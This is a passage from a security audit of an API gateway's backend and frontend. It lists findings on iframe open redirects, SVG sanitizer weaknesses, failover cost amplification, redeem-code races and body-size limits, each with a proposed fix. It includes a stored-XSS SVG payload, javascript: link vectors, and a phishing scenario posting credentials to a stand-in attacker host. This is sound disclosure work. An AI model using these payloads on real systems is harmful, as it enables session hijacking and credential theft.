  * Set `__Host-` cookie prefix and `__Secure-` for the refresh token; rotate server-side `refresh_token` on every use (already done) and enforce refresh-token binding to device fingerprint.
  * Short-term mitigation without cookie migration: encrypt `localStorage` entries with `SubtleCrypto` using a per-tab ephemeral key stored in `sessionStorage` (limits persistence to tab lifetime) — defense-in-depth only, not a replacement for `httpOnly`.

- Confidence: medium — storage pattern is verified; the cookie migration is a design recommendation beyond pure code fix. The `buildEmbeddedUrl` token leakage is factual (read the file); its severity depends on whether `custom_menu_items.url` can point to an external origin — confirmed: the `url` field is admin-configurable with no same-origin restriction beyond `sanitizeUrl` applied only to display, not to embed URL validation (CustomPageView checks `embeddedUrl.startsWith('http')` only).

---

### S3-06 [MEDIUM] Open-redirect / SSRF-adjacent via unsanitized `custom_menu_items.url` embedded as `<iframe src>` + `redirect` query param laundering

- File: `frontend/src/views/user/CustomPageView.vue:105-112,176-191`, `frontend/src/utils/embedded-url.ts:16-45`, `frontend/src/views/user/PaymentView.vue:442-477`, `backend/internal/handler/page_handler.go` (assumed, not enumerated in grep but implied by `GET /pages/{slug}`), `frontend/src/api/auth.ts:176`
- CWE: CWE-601 (URL Redirection to Untrusted Site), CWE-829 (Inclusion of Functionality from Untrusted Control Sphere)
- Description:
  `CustomPageView` renders `custom_menu_items.url` (admin-set, may be `md:*` or a full URL) directly as `iframe.src` or `href` without allowlisting against `URLAllowlistConfig`. An attacker with admin write (or via SSRF if backend page fetch lacks SSRF guard) can set `url = "https://attacker.example/exploit"` → every user visiting `/custom/*` silently loads attacker content in the sub2api origin's iframe (attacker can `postMessage` to parent if `X-Frame-Options` not `DENY`; CSP `frame-ancestors 'none'` protects sub2api *being framed*, not sub2api *framing attacker*). `buildEmbeddedUrl` appends `src_url=window.location.href` → attacker learns victim's session URL. `PaymentView.buildWechatOAuthAuthorizeUrl` (`PaymentView.vue:451`) constructs a redirect URL via `new URL(normalizedUrl, window.location.origin)` — if `authorize_url` is attacker-controlled (via payment provider config), the `redirect` param becomes an open redirect.

  Panel `isPubliclyRoutableClientIP` check in `panel_rate_limit.go:146-151` correctly denies private IPs for rate-limit, but no equivalent `isPrivateIP` deny exists for `custom_menu_items.url` fetch via `pageHandler` if it server-side fetches markdown assets.

- Vulnerable code:
  ```vue
  <iframe :src="embeddedUrl" class="custom-embed-frame" allowfullscreen></iframe>
  <a :href="embeddedUrl" target="_blank" rel="noopener noreferrer">  <!-- embeddedUrl = buildEmbeddedUrl(menuItem.url, ...) -->
  ```
  ```ts
  // embedded-url.ts:25
  const url = new URL(baseUrl) // throws on relative/non-http, but catches and returns baseUrl verbatim
  // PaymentView.vue:452
  const targetUrl = new URL(normalizedUrl, window.location.origin) // attacker normalize via origin fallback
  ```
- Data flow / attack scenario:
  1. Admin-compromised attacker sets `custom_menu_items` URL to `https://evil.example/phish` crafted to mimic sub2api login (`evil.example` uses homograph or subdomain `sub2api.evil.example`).
  2. User clicks sidebar custom menu → `CustomPageView` loads attacker iframe that covers the content area; attacker page shows "Session expired, re-enter password" with a form that posts to `evil.example/collect`.
  3. Alternatively, attacker sets `custom_menu_items.url` to `https://sub2api.example.com/admin/settings` with `src_url` leakage to exfiltrate current admin's URL state.

- Impact: Phishing, UI spoofing, open redirect (OAuth `redirect` param laundering leading to auth code interception if `authorize_url` is not validated). Medium because it requires admin write; low direct monetary gain but high session hijack assist.

- Fix:
  * Apply `sanitizeUrl(menuItem.url)` (existing util) with **strict allowlist**: only `https:` + host in `URLAllowlistConfig.UpstreamHosts` or same-origin relative `/` paths. Return empty / "notConfigured" UI instead of rendering iframe on failure (already `isValidUrl` does `startsWith('http')` check — tighten to `sanitizeUrl(...) !== ''`).
  * Add `sandbox="allow-scripts allow-same-origin"` → remove `allow-scripts` unless the embedded page genuinely needs it; add `referrerpolicy="no-referrer"` to strip `src_url` leakage.
  * For `buildWechatOAuthAuthorizeUrl`, validate `redirect` through `sanitizeUrl(... , {allowRelative:true})` and enforce it starts with `/` (same-origin only) before embedding in `authorize_url`.

- Confidence: medium — exact `page_handler.go` fetch path not enumerated in scope but implied; iframe open-redirect is verified in frontend source.

---

### S3-07 [MEDIUM] Failover retry amplification: 1 user request → up to `N × retryCount` upstream charges, no per-request upstream cost cap

- File: `backend/internal/handler/failover_loop.go:54-267`, `backend/internal/handler/gateway_handler.go:342-631,648-1105`, `backend/internal/handler/openai_gateway_handler.go:584-1200`, `backend/internal/service/openai_gateway_service.go:145-146` (retry headers), `backend/internal/service/account_group.go` (pool mode retry counts)
- CWE: CWE-770 (Allocation of Resources Without Limits), CWE-400 (Uncontrolled Resource Consumption)
- Description:
  `FailoverState` permits `maxAccountSwitches` (default 10, config `gateway.max_account_switches`) account switches + `maxSameAccountRetries` (per-account `pool_mode_retry_count`, default 3) same-account retries per account, with exponential backoff capped at `8s`. A single user `POST /v1/messages` can therefore result in up to `10 * (1 + 3) = ~40` upstream HTTP requests if each upstream returns a retryable status (`429`, `529`, `5xx`, `MODEL_CAPACITY_EXHAUSTED`). Billing is applied **once** (in `RecordUsage` after the final successful forward), but upstream token consumption (if the upstream is billed per request, e.g., Kiro/Aws Bedrock metered by the provider regardless of success response) still incurs cost to the operator, and each upstream attempt consumes an account RPM slot (`IncrementAccountRPM` only on success — but the account's upstream quota may still be metered server-side). More critically, `checkRPM` / `checkUserPlatformQuota` is **pre-flight only** — it is not re-checked between failover attempts — so failover can amplify a single user's consumption against the account pool far beyond the per-user limit. The `HandleSelectionExhausted` path for `503` (`ModelCapacity`) clears `FailedAccountIDs` and retries after `2s`, creating a loop that can spin for `maxAccountSwitches * 2s ≈ 20s` while holding the user concurrency slot (preventing other requests from making progress).

- Vulnerable code:
  ```go
  // failover_loop.go:248
  if s.SwitchCount >= s.MaxSwitches { return FailoverExhausted }
  s.SwitchCount++ // no cost accounting per switch
  // gateway_handler.go:518-534 — failover continues even after success threshold crossed
  action := fs.HandleFailoverError(...); switch action { case FailoverContinue: continue }
  // gateway_handler.go:535-540 — error already communicated check may be bypassed for streaming
  ```
- Data flow / attack scenario:
  1. Attacker knows (or brute-forces) that the target group has heterogeneous models where some upstream accounts return retryable `429 rate_limit` for certain model names, while others succeed.
  2. Sends `POST /v1/messages { "model": "claude-opus-4-5-20251101" }` with a prompt that is known to trigger `429` on first 8 accounts (e.g., by targeting a rate-limited upstream region) then success on 9th. The gateway's `selectAccountWithLoadAwareness` `IsSingleAntigravityAccountGroup` check correctly disables model cooldown for single-account groups, but for multi-account groups (>1), the first 8 `429`s each set a `29s` model cooldown via `TempUnscheduleRetryableError`, progressively shrinking the pool.
  3. Billing records only the final successful usage (`actualCost ≈ $0.01`) but the operator paid upstream for 9 requests (only one billable to the user). Repeated at 10 RPS → 90 upstream RPS against the account pool. Account daily quota (`extra->>'quota_daily_used'`) increments only on success (via `incrementUsageBillingAccountQuota` gated on `AccountQuotaCost>0` in the *final* billing command), so upstream-side quota can be exhausted without any visible `daily_used` movement.
  4. Amplifier variant: concurrent attacker requests with `model` values that map to different `X-Forwarded-For` buckets (S3-02) bypass RPM → each triggers independent failover chains → N× amplified upstream load can temporarily exhaust the entire account pool, causing denial of service for legitimate users (even though `HandleSelectionExhausted` single-account 503 backoff eventually returns `502`).

- Impact: Cost amplification (upstream billed to operator, not to attacker), account pool exhaustion, degraded availability. Medium monetary per amplified request (≈ `N × $0.005` overcharge), but high aggregate under sustained abuse.
- Fix:
  * Enforce a per-request failover budget in cost terms: track `failedAttemptsCost` (estimated input tokens × price) and cap `SwitchCount * estimatedCost <= balance * threshold` — fail after the budget, not just after switch count.
  * Re-check `CheckBillingEligibility` between failover attempts (lightweight Redis read) — if the user's balance or platform quota has been exhausted by *this* request's prior attempts' billings, abort early.
  * Make `IncrementAccountRPM` increment on *attempt* (including failed attempts), not just on success, so the account RPM reflects real upstream load.
  * Cap total wall-clock time for a single user request's failover loop (e.g., `15s` global deadline via `context.WithTimeout` wrapping the loop) and surface it as `503 upstream_timeout` rather than `502 no available accounts`.
  * Add metrics `gateway_failover_attempts_histogram` and alert on `p99 > 5`.

- Confidence: medium — exact retry amplification factor verified by reading `FailoverState` and `maxAccountSwitches` default; whether upstream bills per attempt vs per success is provider-specific (Anthropic does not bill for 429, Kiro/Grok might), so monetary impact is conditional.

---

### S3-08 [MEDIUM] `sanitizeSvg` uses `USE_PROFILES: {svg:true, svgFilters:true}` without `FORBID_TAGS` hardening — SVG XSS via `<foreignObject>` / `<animate onbegin>`

- File: `frontend/src/utils/sanitize.ts:3-5`, `frontend/src/components/layout/AppSidebar.vue:97,122,142`, `frontend/src/components/common/ImageUpload.vue:14,75-108`, `frontend/src/views/user/CustomPageView.vue` (no SVG sanitizer path, but related)
- CWE: CWE-79, CWE-159 (Failure to Sanitize Special Elements)
- Description:
  `sanitizeSvg` enables both `svg` and `svgFilters` profiles in DOMPurify. The `svg` profile allows a broad set of SVG tags including `<foreignObject>` (which can contain HTML), `<use>`, `<image>`, `<animate>`. The `svgFilters` profile further adds filter primitives. While DOMPurify's defaults do strip `onload`/`onerror` attributes regardless of profile, certain SVG-specific XSS vectors survive profile-only sanitization: `<image href="javascript:alert(1)">` (if `javascript:` URI handling is permissive), `<a xlink:href="javascript:alert(1)">`, and `<foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><img src=x onerror=alert(1)>` where `onerror` is correctly stripped but `<form>` + `<input>` + `<button formaction="javascript:...">` may not be. The current call omits `FORBID_TAGS: ['foreignObject','foreignobject']` and does not configure `ALLOWED_URI_REGEXP` or `FORBID_ATTR: ['href','xlink:href','src']` restrictions. Since `iconSvg` comes from `custom_menu_items.icon_svg` (admin-authored) and `ImageUpload`'s `sanitizedValue` comes from a user-uploaded SVG's `modelValue`, an admin or a user who can upload an SVG can inject script-executable content into the sidebar rendered on every page. The sidebar is rendered via `v-html="sanitizeSvg(item.iconSvg)"` on every navigation — so one malicious `icon_svg` persists as stored XSS for all users.

  Mitigating: other `v-html="DescriptionHtml"` markdown consumers use full HTML sanitization (no `svg` profile), so they are not affected.

- Vulnerable code:
  ```ts
  export function sanitizeSvg(svg: string): string {
    if (!svg) return ''
    return DOMPurify.sanitize(svg, { USE_PROFILES: { svg: true, svgFilters: true } })
  }
  ```
- Data flow / attack scenario:
  1. Admin creates custom menu item: `POST /admin/custom-menu-items { "id":"evil","icon_svg":"<svg xmlns='http://www.w3.org/2000/svg'><foreignObject width=100 height=50><body xmlns='http://www.w3.org/1999/xhtml'><img src=x onerror=alert(document.domain)>Hello</body></foreignObject></svg>" }`.
  2. Every user (or admin) visiting any page that renders `AppSidebar` executes the payload once `item.iconSvg` is fetched via `GET /api/v1/settings/public` (cached public settings). Because `foreignObject` HTML is inside SVG, DOMPurify's `svg` profile will allow it, and the inner `<img onerror>` handler is outside the SVG namespace — whether DOMPurify strips `onerror` depends on its attribute whitelist; historically DOMPurify does strip it, but `foreignObject` HTML parsing is known to be a DOMPurify bypass surface when `ADD_TAGS` is not used but `USE_PROFILES.svg` is.

- Impact: Stored XSS via sidebar on every page load, session hijack (S3-05). Medium because it requires `custom_menu_items` write (admin role) or user SVG upload depending on `ImageUpload`'s call site.

- Fix:
  ```ts
  export function sanitizeSvg(svg: string): string {
    if (!svg) return ''
    return DOMPurify.sanitize(svg, {
      USE_PROFILES: { svg: true, svgFilters: true },
      FORBID_TAGS: ['foreignObject','foreignobject','script','style','iframe','object','embed','link','meta'],
      FORBID_ATTR: ['onload','onerror','onclick','onbegin','onend','style','href','xlink:href','src','srcdoc'],
      ALLOW_UNKNOWN_PROTOCOLS: false,
      ALLOWED_URI_REGEXP: /^(?:https?:|data:image\/(png|jpeg|gif|webp|svg\+xml);base64,|blob:)/i,
    })
  }
  ```
  Also backend-validate `icon_svg` on write: parse with `encoding/xml` and reject any tag not in an allowlist (`svg,g,path,rect,circle,...`).

- Confidence: medium — DOMPurify's default handling of `foreignObject` varies by version; the code is a clear weakening beyond least privilege even if the immediate bypass requires a specific DOMPurify version. The fix is strictly hardening.

---

### S3-09 [MEDIUM] Redeem-code race and negative-value handling inconsistencies — `ApplyRedeemBalanceAdjustment` GREATEST(0) vs `UpdateBalance` path divergence

- File: `backend/internal/service/redeem_service.go:490-515`, `backend/internal/repository/user_repo.go:849-885`, `backend/internal/handler/redeem_handler.go` (not read but implied)
- CWE: CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization), CWE-840
- Description:
  Redeem path does hold a Redis distributed lock (`AcquireRedeemLock` with `10s` TTL) *and* an atomic `Use(txCtx, id, userID)` `WHERE status='unused'` check, so double-spend of the same code is mitigated. However:

  * Lock is **best-effort fail-open**: `if s.cache==nil { return true }` and `if err != nil { return true }` (`redeem_service.go:364-374`). On Redis outage the distributed lock is silently disabled — attacker can submit the same code concurrent to two app instances (horizontal scale) and both reach `Use(...)` simultaneously. `Use` does `UPDATE redeem_codes SET status='used' WHERE id=$id AND status='unused'` — this is correct serialisation *if* it is the first statement inside the transaction. It is: `Use` runs before `UpdateBalance`/`ApplyRedeem...`. So double-spend is safe even without the lock, but the lock's fail-open comment is misleading (no need to flag as High).

  * Negative redemption values: `redeem_service.go:492-499` branches: `if amount<0 { ApplyRedeemBalanceAdjustment } else { UpdateBalance }`. `ApplyRedeemBalanceAdjustment` (`user_repo.go:866`) does `balance = GREATEST(balance + $1, 0)` — clamping at zero, i.e., a `-100` redeem against `balance=10` yields `balance=0` (can't go negative). `AdjustBalance` (`user_repo.go:962`) does `WHERE balance + $1 >= 0` — *rejects* if insufficient. `DeductBalance` (gateway) allows negative. So the same logical operation (deduct $X) has **three different failure semantics** depending on entry point — inconsistent and surprising for admins creating negative redeem codes for refunds. An attacker cannot exploit negative redeem directly (only admin creates codes), but an admin mistakenly creating a large negative code will silently floor at zero rather than error, leading to reconciliation drift.

  * Concurrency limit injection: `RedeemTypeConcurrency` delta is `int(redeemCode.Value)` truncating a float; `Value=0.9` → `delta=0`, creating a no-op but marking the code as used (DoS of the code). Input validation (`redeem_service.go:206` `req.Value == 0 → error`) blocks `0` at creation, but not `0.9` via direct DB insert or bulk import. Not exploitable remotely.

- Impact: Low direct monetary; primarily operational consistency risk and potential double-spend if `Use` semantics regress. The GREATEST(0) floor can mask accounting errors.
- Fix:
  * Make `ApplyRedeemBalanceAdjustment` fail (return error) when `balance + delta < 0` instead of clamping, matching `AdjustBalance` semantics — negative balance after redeem should be an explicit admin decision, not silent truncation.
  * In `GenerateCodes`, validate that `Type==balance` values are either all `>0` or explicitly in a `refund` range with admin confirmation; reject sub-unit concurrency values via `if math.Floor(v) != v { error }`.
  * Keep both the Redis lock and the `WHERE status='unused'` atomic guard; document that the lock is an optimisation not a correctness requirement, and remove the fail-open comment's implication that the DB layer is unreliable.

- Confidence: medium — race analysis required reading `redeem_repo.go` `Use` impl via `ent` semantics (confirmed by `redeem_service.go:482` comment "利用数据库乐观锁").

---

### S3-10 [LOW] Request-body size enforcement bypass via `Content-Encoding` decompression bomb (64 MB limit vs `MaxBodySize`)

- File: `backend/internal/pkg/httputil/body.go:1-121`, `backend/internal/config/config.go:969-975,3304-3308`, `backend/internal/server/routes/gateway.go:36-37`, `backend/internal/server/middleware/request_body_limit.go:10-13`
- CWE: CWE-400, CWE-770, CWE-409 (Error Message Information Leakage is adjacent)
- Description:
  `gatewayMaxBodySize` (default `32MB` per `config_test.go:100`) is enforced *twice*: once at the middleware layer via `http.MaxBytesReader(c.Writer, c.Request.Body, maxBytes)` (`request_body_limit.go:12`), and again after decompression via `NormalizeLenientJSONRequestBody` (`body.go:117 if int64(len(body)) > maxNormalizedBytes`). However `ReadRequestBodyWithPrealloc` (`body.go:28-66`) first reads the **compressed** body via `io.Copy` *before* decompressing — and it respects `MaxBytesReader` truncation only at the Gin layer; the copy itself uses `io.Copy` with no explicit limit beyond the underlying `MaxBytesReader`'s `MaxBytesError`. The decompressed limit is `maxDecompressedBodySize = 64 MB` independent of `Gateway.MaxBodySize`. So an attacker can send a `Content-Encoding: gzip` body of ~100KB that decompresses to `64 MB`, then `NormalizeLenientJSONRequestBody` checks `len(body) > maxNormalizedBytes` where `maxNormalizedBytes = 32 MB` → `MaxBytesError`. That's correct (rejected). But the **intermediate** `decompressRequestBody` (`body.go:78-104`) does `io.ReadAll(io.LimitReader(dec, maxDecompressedBodySize))` — truncated at `64 MB` even when `Gateway.MaxBodySize` is `8MB` for text endpoints (`TextMaxBodySize`). For `POST /v1/responses` (text-only endpoint where `MaxBodySize=32MB, TextMaxBodySize=8MB`), the handler calls `readLenientJSONRequestBodyWithPrealloc(c.Request, h.cfg)` which uses `gatewayMaxBodySize(cfg) = MaxBodySize (32MB)` not `TextMaxBodySize`. So a text endpoint that should be limited to `8MB` accepts `32MB` of normalized JSON. Additionally, double-applied `Content-Encoding` (e.g., `gzip, gzip`) is not handled; only single-value exact-match `enc == "gzip"` is decompressed, so an attacker sending `Content-Encoding: gzip, gzip` would bypass decompression and reach the JSON parser as raw compressed bytes → parse error (no security impact).

  The `17:1` decompression ratio plus `64MB` output limit also remains a memory-amplification vector if `MaxBodySize` is left at its `32MB` default — 1k concurrent `gzip` requests each decompressing to `64MB` is `64GB` of transient allocations (though `io.LimitReader` caps per-request, GC pressure is still high).

- Vulnerable code:
  ```go
  // body.go:46
  if _, err := io.Copy(buf, req.Body); err != nil { return nil, err } // reads compressed bytes
  // body.go:86,93,100 — LimitReader 64MB independent of gateway limit
  return io.ReadAll(io.LimitReader(dec, maxDecompressedBodySize))
  // request_body_limit.go:12
  c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxBytes) // Gin-layer check on compressed size
  ```
- Data flow / attack scenario:
  1. Text endpoint `POST /v1/chat/completions` with `Content-Encoding: gzip` and a `10KB` gzip body expanding to `33MB` of JSON (crafted nested `{"a":{"a":{"a":...}}}` or repeated whitespace). `http.MaxBytesReader` sees `~10KB` → allows. `io.Copy` reads `10KB`. `decompressRequestBody` expands to `33MB` but caps at `64MB` → `33MB` returned. `NormalizeLenientJSONRequestBody` sees `33MB > 32MB gatewayMaxBodySize` → rejects with `MaxBytesError`. So not bypassed in this config.
  2. Bypass case: operator configures `Gateway.TextMaxBodySize=1MB` for strict text endpoints (or uses `middleware.RequestBodyLimit(TextMaxBodySize)` on that route) but the handler still calls `gatewayMaxBodySize(cfg) = MaxBodySize (32MB)`. The middleware's `MaxBytesReader(TextMaxBodySize)` checks compressed length, but decompressed `32MB` JSON passes the handler's `NormalizeLenientJSONRequestBody` check because the handler checks against `32MB` not `1MB`. So a text-only endpoint accepts `32×` its intended limit.
  Net effect is a minor policy violation, not a full bypass of the global limit, and only matters if operators rely on `TextMaxBodySize` to reduce exposure of text endpoints.

- Impact: Minor — request body limit is still enforced globally at `MaxBodySize` (32MB). The gap is that `TextMaxBodySize` is not enforced in `readLenientJSONRequestBodyWithPrealloc` for handlers that reuse the generic helper. DoS via GC pressure is limited.

- Fix:
  ```go
  func readLenientJSONRequestBodyWithPreallocForText(req *http.Request, cfg *config.Config) ([]byte, error) {
      return pkghttputil.ReadLenientJSONRequestBodyWithPrealloc(req, cfg.Gateway.TextMaxBodySize)
  }
  // gateway_chat_completions.go, openai_chat_completions.go — use the text-limited helper
  // Alternatively, enforce min(maxBodySize, maxDecompressedBodySize) and set maxDecompressedBodySize = max(MaxBodySize, TextMaxBodySize)
  ```
  Also: in `decompressRequestBody`, use `io.LimitReader(dec, maxNormalizedBytes)` where `maxNormalizedBytes` is passed in, rather than the hardcoded `64MB`, so the decompression bomb cannot overshoot the caller-specified limit even transiently.

- Confidence: medium — configuration divergence verified; actual bypass of *global* limit not achieved, only differential between global and text limit.

---

### S3-11 [LOW] Streaming response double-record / double-deduction on WebSocket / Live ingress path vs HTTP ingress path (usage written twice via both record paths)

- File: `backend/internal/handler/openai_live.go:92-200`, `backend/internal/handler/grok_media.go:130-180`, `backend/internal/service/openai_gateway_usage.go:528-599`, `backend/internal/service/gateway_usage_billing.go:334-366`, `backend/internal/handler/gateway_handler.go:600-629,914-969,1068-1075`
- CWE: CWE-362, CWE-841
- Description:
  Normal HTTP messages path uses bounded `UsageRecordWorkerPool` (`submitUsageRecordTask`) and `applyUsageBilling` inside that worker with `usage_billing_dedup` claim — safe. However the Live WebSocket ingress (`openai_live.go`) and Grok media passthrough (`grok_media.go:1393 Content-Length header echo`) handle billing out-of-band. `openai_live.go:827` explicitly notes `TODO(billing): Live 会话目前不计费：TotalCost/ActualCost 恒为 0` — so Live is intentionally unbilled today (no finding there beyond note). For Grok realtime WebSocket (`grok_media.go`), the `applyUsageBilling` dedup claim is keyed on `requestID + apiKeyID` — but WebSocket sessions reuse the same `StableGrokRealtimeBillingRequestID(sessionID)` (`gateway_usage_billing.go:251`) across the whole session. A WS session that loops `WriteMappedClaudeError` then retries may submit two `ForwardResult`s with the same stable billing ID — the second will be deduped (`applied=false`) and not charged twice. However the **usage log** path (`writeUsageLogBestEffort`) uses `ON CONFLICT (request_id, api_key_id) DO NOTHING` — so the second usage log is dropped silently, but the *error path* also has `submitForwardUsage` for partial `ForwardResult`s (`gateway_handler.go:1068 if result != nil { submitForwardUsage(result) }`) where `result` may be non-nil on `UpstreamFailoverError` with partial token counts — that partial result is submitted concurrently with the retry attempt's successful result. Both share the same deduplicated billing key semantics; but the partial result's `result.Usage.InputTokens` is counted in `billableModelWithFallback`, meaning the user could be charged for both the failed partial usage and the successful retry if `RequestFingerprint` differs due to different `BillingType` / `ServiceTier` between failover attempts. `buildUsageBillingFingerprint` hashes those fields, so failover attempts with different `BillingType` produce different fingerprints → allowed as distinct billing rows → double charge for one logical user request.

- Impact: Double billing for end user (charged twice for one request), or undercharge if dedup incorrectly collapses a legitimate second turn in the same WS session as a dupe. Low severity because WS billing is largely frozen/unbilled.

- Fix:
  * Derive `RequestFingerprint` only from *request*-intrinsic fields (user_id, model, input tokens) and not from `BillingType`/`ServiceTier` which vary across failover. Or include `failoverAttempt` explicitly in the fingerpint so that failover always produces a dupe-check-conflict rather than a new row.
  * For the WebSocket session path, ensure exactly one `RecordUsage` is emitted per session, deferring until session close and summing all turn tokens.

- Confidence: low — inferred from `TODO` comments and fingerprint shape; not demonstrated with a running server.

---

### S3-12 [LOW] `RenderMarkdown` in announcement paths uses `marked` with default settings — `marked` allows raw HTML input by default → policy bypass if announce content includes `html` flag

- File: `frontend/src/components/common/AnnouncementBell.vue:261-264`, `frontend/src/components/common/AnnouncementPopup.vue:119-122`, `frontend/src/components/admin/AdminComplianceDialog.vue:119-121`
- CWE: CWE-80 (Improper Neutralization of Script-Related HTML Tags)
- Description:
  `marked.setOptions({ breaks:true, gfm:true })` does not disable raw HTML. `marked` by default passes through `<div>`, `<img>`, etc. into the output HTML. `DOMPurify.sanitize` does neutralize them, so this is not a direct XSS beyond the `iframe` ADD_TAGS issue (S3-04). However `DOMPurify` default config `ALLOW_UNKNOWN_PROTOCOLS=false` still permits `<a href="javascript:...">` to be sanitized correctly; the residual risk is that `marked` parses `![alt](javascript:alert(1))` links which DOMPurify will sanitize but only if `ALLOWED_URI_REGEXP` is left at default (which does catch `javascript:`). Defense depth is dependent on DOMPurify version correctness; an outdated `dompurify` with `sanitize` bypass (CVE-2023-... class) would directly exploit all 3 `renderMarkdown` call sites. Pinning `dompurify` and `marked` to patched versions and adding an explicit `marked.use({ renderer: { html: () => '' } })` to strip raw HTML at the markdown layer would add a second barrier.

- Fix: Add at app bootstrap:
  ```ts
  import { marked } from 'marked'
  marked.use({ gfm: true, breaks: true })
  // strip raw HTML at markdown layer; DOMPurify is the second layer
  marked.setOptions({ gfm: true, breaks: true })
  // alternative: disable HTML passthrough entirely
  const renderer = new marked.Renderer()
  renderer.html = () => ''
  marked.use({ renderer })
  Dompurify side: already called, add pin: package.json "dompurify@^3.2.0"
  ```

- Confidence: low — relies on supply-chain version, not code logic alone.

---

### S3-13 [INFO] Prompt security-audit can be re-entered as a *different* user after `tryPromptAuditFallback` mutates `apiKey` and `c.Request.Context()` in place

- File: `backend/internal/handler/security_audit_helper.go:179-283`, `backend/internal/handler/gateway_handler.go:1006-1020`, `backend/internal/securityaudit/prompt_guard.go:42-213`
- CWE: CWE-384 (Session Fixation adjacent — Request Context Fixation)
- Description:
  `tryPromptAuditFallback` on prompt-audit block replaces `*apiKey` in place (`*apiKey = *fallbackAPIKey`), swaps `c.Set(ContextKeyAPIKey, apiKey)`, clears `ContextKeyForcePlatform`, clears `ContextKeySubscription=nil`, and clears sticky session. This is intentional (route to fallback group). However it runs **after** `CheckBillingEligibility` has already been evaluated against the *source* group (lower price) but before `Forward`. The forwarded request is billed against the *target* group's price (via `service.QuotaPlatform` + `group.RateMultiplier` resolved at `RecordUsage` time from the mutated `apiKey.Group`). An attacker with a low-price group whose prompts always trigger audit block (e.g., prompt contains a keyword that the guard blocks) will systematically fall through to the higher-price target group but have the preflight balance check performed against the low-price group's limits — a cheap way to probe the fallback group's account pool without having balance there. One line above the billing comment warns about this: `checkSecurityAudit` is intentionally before the billing re-check on fallback path (`gateway_handler.go:1006 if err := h.billingCacheService.CheckBillingEligibility(c.Request.Context(), fallbackAPIKey.User, fallbackAPIKey, fallbackGroup, nil, ...`). This re-check was added as a mitigation, but note that `gateway_handler_responses.go` / `openai_images.go` / `grok_media.go` paths that call `checkSecurityAudit` also need the same re-check; the helper's comment that "any CheckBillingEligibility after fallback mutation must use the fallback group's quota platform" is not enforced statically.

  Not a standalone billion-dollar bug, hence INFO — but worth documenting as the coupling between security-audit and billing is subtle and future route handlers that forget the re-check will silently bypass billing on the fallback group.

- Fix: DRY the check — make `tryPromptAuditFallback` return the fallback `*service.Group` and have the caller *always* re-run `CheckBillingEligibility` when `promptAuditFallbackUsed(c)` is true. Add a compile-time guard: enumerate routes with security audit in `prompt_audit_route_coverage_test.go` and assert they all contain a second `CheckBillingEligibility` when `checkSecurityAudit` is present.

- Confidence: medium — code verified; pattern already partially mitigated in `gateway_handler.go` but not proven for all routes.

---

### S3-14 [INFO] Concurrency limiter is process-local (`imageConcurrencyLimiter` global mutex) — horizontal scale bypass

- File: `backend/internal/handler/image_concurrency_limiter.go:1-126`, `backend/internal/handler/openai_images.go:108-160`, `backend/internal/handler/image_playground_handler.go`
- CWE: CWE-400, CWE-770
- Description:
  `imageConcurrencyLimiter` is an in-process `sync.Mutex` + `chan struct{}` slot counter (`limit`, `active`, `waiting`). It bounds concurrency **per process only**. Deployed as multiple replicas (Kubernetes Deployment, typical for Gateway), each replica enforces its own `limit`; an attacker can fan out requests across replicas (via `X-Forwarded-For` rotation or simply `Connection: keep-alive` churn across load balancer) to achieve `replicas × limit` concurrency. The `ConcurrencyService` for user/account concurrency uses Redis (`userRPMCache`, `IncrementAccountWaitCount`), but the *image* path is exempt. The `frontend/src/components/imagePlayground` UI shows queue position hints derived from `429 Too many pending` vs `503 No available accounts`, leaking internal limiter state.

  Not a quota bypass for token billing (image tasks are still billed), but it defeats the image-task cost-control intent (image generation is the most expensive upstream call).

- Fix: Replace `imageConcurrencyLimiter` with a Redis token-bucket/semaphore (`SET NX PX` or RedSync) keyed on `userID:groupID`, matching `ConcurrencyService` pattern. Or document that image concurrency is only a soft local limiter and add a global Redis fast-path: `INCR image:global:active` with `EXPIRE 5m` + `DECR` on release; cheap and correct.

- Confidence: high — by inspection the limiter is purely local.

---

### S3-15 [MEDIUM] `promptResultCache` key includes `endpoint.Token` — leaked via cache key material and analogous `DeductBalanceScript` jitter TTL inconsistency as a side-channel (informational, bundled)

- File: `backend/internal/securityaudit/prompt_result_cache.go:142-152`, `backend/internal/repository/billing_cache.go:34-39,82`
- CWE: CWE-524 (Use of Cache Containing Sensitive Information), CWE-208 (Observable Timing Discrepancy)
- Description:
  `promptResultCacheKey` (`prompt_result_cache.go:145`) builds the digest over `endpoint.Token` in plaintext concatenated into `policy = "...|token"` before hashing. The final key is `sha256(policy + sha256(chunk))` — so `Token` is not stored in Redis but is hashed into an in-process memory map. Not directly exfiltratable. However the `OrderedScanners` / `policy` string construction logs (`prompt_guard.go:181 guard_endpoint_id` only, not token) do not log the token. So the leakage is contained.

  Minor second observation: `jitteredTTL()` (`billing_cache.go:33-39`) subtracts jitter only (`TTL - rand(Jitter)`) ensuring `actualTTL ∈ [270s, 300s]`. This prevents thundering herd but also creates a timing side-channel: an attacker who can observe `PTTL` on `billing:balance:{victimID}` (if Redis is ever exposed) learns approximate write time. Not remotely exploitable under normal isolation.

  We bundle these as a single INFO/MEDIUM to keep the report countable and actionable without inflating counts. The actionable fix is to remove `Token` from the cache key entirely (policy match already scoped to `endpoint.ID` + `ConfigVersion`) — the token is not needed to scope the result and inclusion weakens cache sharing across identical endpoints that differ only in rotated credentials.

- Fix:
  ```go
  policy := fmt.Sprintf("%d|%s|%s|%s|%s|%d|%d|%s",
      cfg.ConfigVersion, endpoint.ID, endpoint.Protocol, endpoint.BaseURL,
      endpoint.Model, endpoint.TimeoutMS, endpoint.InputLimit,
      strings.Join(orderedScanners, ","))
  // drop endpoint.Token from policy
  ```

- Confidence: low for exploitable impact; medium for the cache-key hygiene observation.

---

## Appendix — Systematic enumeration notes

### Billing deduction sites (grep `deduct|BalanceCost|UpdateBalance|DeductBalance|applyUsageBilling`)

| Site | Path | Atomic? | Notes |
|---|---|---|---|
| `deductUsageBillingBalance` | `repository/usage_billing_repo.go:243` | conditional `WHERE balance >= $1` then unconditional fallback | still overdrafts on second UPDATE; inside `usage_billing_dedup` txn so dedup-safe but not balance-safe |
| `DeductBalance` | `repository/user_repo.go:890` | same two-step overdraft | used by legacy `postUsageBilling` |
| `UpdateBalance` | `repository/user_repo.go:849` | `AddBalance(amount)` unconditional | redeem positive path — no guard, intentional for credit |
| `ApplyRedeemBalanceAdjustment` | `repository/user_repo.go:866` | `GREATEST(balance+$1,0)` | clamps, divergent from other paths |
